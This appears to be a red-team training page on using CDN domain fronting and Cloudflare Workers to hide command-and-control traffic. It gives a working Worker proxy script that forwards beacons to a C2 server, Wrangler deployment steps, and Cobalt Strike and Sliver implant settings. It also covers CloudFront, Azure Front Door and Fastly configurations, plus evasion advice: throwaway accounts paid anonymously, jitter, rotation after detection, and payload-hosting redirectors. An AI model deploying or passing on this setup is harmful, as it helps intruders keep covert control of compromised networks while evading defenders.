---
layout: training-page
title: "CDN Domain Fronting — Red Team Academy"
module: "Infrastructure Engineering"
tags:
  - infrastructure
  - domain-fronting
  - cdn
  - cloudflare
  - opsec
page_key: "infrastructure-cdn-fronting"
render_with_liquid: false
---

# CDN Domain Fronting

Domain fronting exploits the separation between the TLS SNI field and the HTTP Host header to route C2 traffic through high-reputation CDN infrastructure. When properly implemented, C2 beacon traffic appears to originate from and terminate at a legitimate, trusted CDN — making it extraordinarily difficult to block without collateral damage.

## Domain Fronting Primer

### How CDNs Route Traffic

```
Normal TLS/HTTPS request:
  1. TLS ClientHello → SNI = "evil.com" (visible to network observer, firewall)
  2. CDN terminates TLS based on SNI
  3. HTTP GET → Host: evil.com (inside TLS, not visible to network observer)
  4. CDN routes to origin based on Host header

Domain fronting request:
  1. TLS ClientHello → SNI = "legitimate.cdn-provider.com" (what firewall sees)
  2. CDN terminates TLS (legitimate cert served — no TLS error)
  3. HTTP GET → Host: c2.attacker.com (inside TLS — hidden from firewall)
  4. CDN routes to c2.attacker.com origin based on Host header

Result:
  - Firewall sees: TLS to legitimate CDN IP (e.g., Cloudflare 104.21.x.x)
  - Traffic appears to be: *.cloudflare.com
  - Actual destination: your C2 server
```

### Why It Was Powerful

- Blocking the CDN IP blocks legitimate business traffic for thousands of companies
- CDN IP ranges are broadly whitelisted in corporate proxy bypass rules
- TLS certificate is valid (belongs to CDN) — no certificate warning
- Traffic volume blends with massive legitimate CDN usage

### Post-2018 Crackdowns

Amazon (April 2018) and Google (April 2018) disabled domain fronting by rejecting HTTP Host headers that did not match the SNI:

```
Amazon CloudFront: Returns 421 Misdirected Request if Host != SNI
Google (App Engine): Similar enforcement
Azure CDN: Enforced SNI/Host matching
Fastly: Enforced matching after 2019

Still working approaches (as of 2025):
  - Cloudflare Workers (different mechanism — not traditional fronting)
  - Some smaller CDN providers that have not enforced matching
  - Azure Front Door (specific configurations)
```

## Cloudflare Workers as Redirector

Cloudflare Workers are the most reliable "fronting-adjacent" technique available in 2025. The Worker script runs at Cloudflare's edge and proxies requests to your C2.

### Mechanism

```
Beacon → cloudflare.com edge (your Worker URL) → Worker script → C2 server

What defender sees:
  - TLS to: [your-worker].workers.dev OR your custom domain on Cloudflare
  - HTTP Host: your custom domain
  - Connection from: Cloudflare IP range (1.1.1.0/24 and similar)

Key distinction from traditional fronting:
  - SNI and Host match (your Cloudflare domain)
  - The fronting is from Cloudflare's IP being trusted, not SNI mismatch
  - Worker intercepts and proxies — full programmable logic
```

### Cloudflare Worker Setup

```javascript
// Worker script: proxy C2 traffic

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  // Extract path and headers from incoming beacon request
  const url = new URL(request.url)
  
  // Validation: check for beacon-specific URI pattern
  const validPaths = ['/api/v2/', '/updates/', '/cdn/']
  const isValidBeacon = validPaths.some(p => url.pathname.startsWith(p))
  
  if (!isValidBeacon) {
    // Return innocuous content for non-beacon traffic
    return new Response('Service Unavailable', { 
      status: 503,
      headers: { 'Content-Type': 'text/plain' }
    })
  }
  
  // Build request to C2 backend
  const c2Url = 'https://[C2_IP]' + url.pathname + url.search
  
  const modifiedRequest = new Request(c2Url, {
    method: request.method,
    headers: request.headers,
    body: request.body
  })
  
  // Forward to C2
  try {
    const c2Response = await fetch(modifiedRequest)
    return c2Response
  } catch (e) {
    return new Response('Not Found', { status: 404 })
  }
}
```

### Deploying the Worker

```bash
# Install Wrangler CLI
npm install -g wrangler

# Authenticate (throwaway Cloudflare account)
wrangler login

# Create worker project
wrangler init c2-worker
cd c2-worker

# Edit wrangler.toml
cat > wrangler.toml << 'EOF'
name = "c2-worker"
main = "src/index.js"
compatibility_date = "2024-01-01"
workers_dev = true

# Custom domain (optional — requires domain on Cloudflare)
# [[routes]]
# pattern = "update.yourdomain.com/*"
# zone_name = "yourdomain.com"
EOF

# Deploy
wrangler deploy

# Output: Published c2-worker (https://c2-worker.[account].workers.dev)
```

### Beacon Configuration for Cloudflare Worker

```
Cobalt Strike listener configuration:
  HTTP Hosts: c2-worker.[account].workers.dev
  HTTP Host Rotation: round-robin
  Beaconing: HTTP GET/POST to worker URL
  
  Malleable profile URI must match Worker's valid path check:
  set uri "/api/v2/data";
  
Sliver configuration:
  ./sliver-server
  [server] > http --lhost 0.0.0.0 --lport 443
  
  # Implant generation pointing to Worker
  [server] > generate --http c2-worker.[account].workers.dev --os windows
```

## AWS CloudFront Configuration

### Origin Configuration for C2

```
1. Log into AWS (throwaway account, prepaid card or crypto via BitLaunch)

2. Create CloudFront distribution:
   - Origin Domain: [C2_IP] (your VPS)
   - Origin Protocol Policy: HTTPS Only
   - Viewer Protocol Policy: Redirect HTTP to HTTPS

3. Behavior configuration:
   - Path Pattern: /api/* (match beacon URIs)
   - Cache Policy: Managed-CachingDisabled (critical — C2 responses must not be cached)
   - Origin Request Policy: All Viewer (forward all headers to origin)

4. Custom headers (for beacon validation at C2):
   - Add custom header: X-Beacon-Auth: [secret-value]
   - C2 validates this header before processing

5. Domain: Use CloudFront domain (abc123.cloudfront.net)
   or configure custom domain with ACM certificate
```

```bash
# Test CloudFront distribution
curl -sk "https://abc123.cloudfront.net/api/v2/beacon" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# Verify response comes from CloudFront, not C2 directly
curl -sI "https://abc123.cloudfront.net/api/v2/beacon" | grep -i "x-cache\|via\|server"
# Expected: Via: 1.1 cloudfront (CloudFront), x-cache: Miss from cloudfront
```

### CloudFront Behavior Rules for C2 Traffic

```
AWS Console → CloudFront → Distribution → Behaviors:

Create behavior:
  Path pattern:        /api/v2/*
  Origin:              C2 server
  Viewer protocol:     HTTPS only
  Allowed HTTP methods: GET, HEAD, OPTIONS, PUT, POST, PATCH, DELETE
  Cache policy:        CachingDisabled
  
Fallback behavior (default):
  Path pattern:        *
  Origin:              legitimate website (cover traffic)
  Cache policy:        CachingOptimized
```

## Azure CDN and Azure Front Door

```
Azure Front Door (preferred over classic CDN for this use case):

1. Create Front Door profile (Standard or Premium tier)
2. Add origin: your C2 server IP
3. Configure route:
   - Patterns to match: /api/*, /updates/*
   - Accepted protocols: HTTPS only
   - Origin group: C2 server
   - Forwarding protocol: HTTPS only
   - Cache: disabled

4. Custom domain (optional):
   - Add custom domain to Front Door
   - Validate via DNS CNAME to Front Door hostname

Azure CDN endpoint URL format:
  [profile-name].azurefd.net/api/v2/beacon
```

## TLS Considerations with CDN

```
What happens to TLS when using CDN fronting:

CLIENT                    CDN EDGE              C2 SERVER
  |                          |                     |
  |--TLS to CDN cert-------->|                     |
  |  (legitimate CDN cert)   |--TLS to C2 cert---->|
  |                          |  (C2 self-signed     |
  |<--TLS from CDN cert------|   or Let's Encrypt)  |
  |                          |<--TLS from C2--------|

What SOC sees in DLP/proxy:
  - TLS to: cloudflare.com, azurefd.net, etc.
  - Certificate: valid, issued to CDN domain
  - No indication of C2 in TLS inspection (unless CDN is also inspected)

Full TLS inspection (MITM proxy) by enterprise:
  - If enterprise does full TLS inspection (Zscaler, Palo Alto SSL decrypt):
  - CDN fronting may be partially visible via Host header after decryption
  - However: many enterprise proxies cannot decrypt CDN traffic due to 
    certificate pinning and CDN provider policies
  
DNS resolution visible to defender:
  - Defender sees DNS query to CDN domain (legitimate)
  - No DNS query to C2 domain (not exposed)
```

## Fastly VCL Configuration

```
Fastly uses VCL (Varnish Configuration Language) for edge logic.

# fastly_c2_proxy.vcl

sub vcl_recv {
  # Block non-beacon traffic
  if (!req.url ~ "^/api/v2/") {
    error 503 "Service Unavailable";
  }
  
  # Validate user agent
  if (req.http.User-Agent !~ "Mozilla/5\.0") {
    error 302 "https://www.microsoft.com/";
  }
  
  # Route beacon to C2 origin
  set req.backend = c2_backend;
  set req.http.Host = "cdn.yourdomain.com";
}

sub vcl_error {
  if (obj.status == 302) {
    set obj.http.Location = obj.response;
    set obj.response = "Found";
    return(deliver);
  }
}
```

## Detection: How SOCs Catch CDN Fronting

Understanding detection helps improve OPSEC:

```
Detection method 1: JA4 fingerprinting of beacon client
  - Even through CDN, the TLS client (beacon) has a JA4 fingerprint
  - JA4 of Cobalt Strike/Sliver known and watchlisted
  - CDN termination creates server-side JA4 from CDN → C2 (not visible to defender)
  - Mitigation: malleable C2 profiles, custom JA3 configuration

Detection method 2: Header correlation
  - Full TLS inspection proxies see HTTP Host header inside TLS
  - Host header mismatch with SNI is a detection signal
  - Mitigation: Cloudflare Workers (no Host/SNI mismatch)

Detection method 3: Behavioral analytics
  - Beacon traffic has regular timing (sleep interval)
  - Even via CDN, the timing pattern is visible on egress
  - Mitigation: jitter (randomize sleep: sleep(N + random(0, N*0.3)))

Detection method 4: CDN provider cooperation
  - Large organizations can request CDN provider to investigate
  - CDN can log or terminate connections to specific Workers/origins
  - Mitigation: multiple CDN providers, rapid rotation on burn

Detection method 5: Certificate transparency for Worker domains
  - workers.dev subdomains are logged in CT
  - Custom domains on Cloudflare are also CT logged
  - Mitigation: monitor your own CT entries, rotate domains proactively
```

## What Still Works in 2025

| Technique | Status | Notes |
|-----------|--------|-------|
| Cloudflare Workers | Working | Free tier available, scriptable, reliable |
| CloudFront with valid origin | Working | Requires AWS account, valid origin |
| Azure Front Door | Working | Requires Azure account |
| Traditional SNI/Host mismatch (AWS, GCP) | BLOCKED | Disabled 2018 |
| Traditional SNI/Host mismatch (Cloudflare) | BLOCKED | Enforced since 2019 |
| Fastly | Requires testing | Varies by configuration |
| Custom CDN providers | Varies | Research specific provider |

## Operational Recommendation

```
Best practice infrastructure for 2025:

1. Use Cloudflare Workers for C2 callback traffic
   - Free tier sufficient (100k requests/day)
   - Throwaway Cloudflare account
   - Worker script validates beacon pattern before proxying
   - Rotate Worker URL monthly or on burn signal

2. Use Apache mod_rewrite redirectors for payload hosting
   - Direct HTTPS from victim to redirector
   - Redirector serves signed payloads (lolbins, trusted formats)
   
3. Reserve direct redirectors for internal-network callbacks
   - If victim is on internal network without internet egress
   - DNS-over-HTTPS or DNS C2 may be required instead
```
